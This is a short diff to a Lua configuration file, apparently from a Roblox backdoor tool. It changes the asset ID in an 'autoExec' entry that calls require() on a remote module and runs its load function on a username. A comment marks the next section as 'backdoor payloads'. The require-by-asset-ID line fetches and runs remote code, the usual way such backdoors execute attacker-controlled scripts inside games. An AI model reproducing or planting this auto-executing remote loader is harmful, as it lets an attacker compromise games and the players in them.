@@ -52,7 +52,7 @@ return {
 	},
 	["autoExec"] = {
 	[[warn("mico on top")]],
-	[[require(78198585969550).load(%username%)]],
+	[[require(7192763922).load(%username%)]],
 	},
 	-- $backdoor payloads
 	["backdoorPayloads"] = {
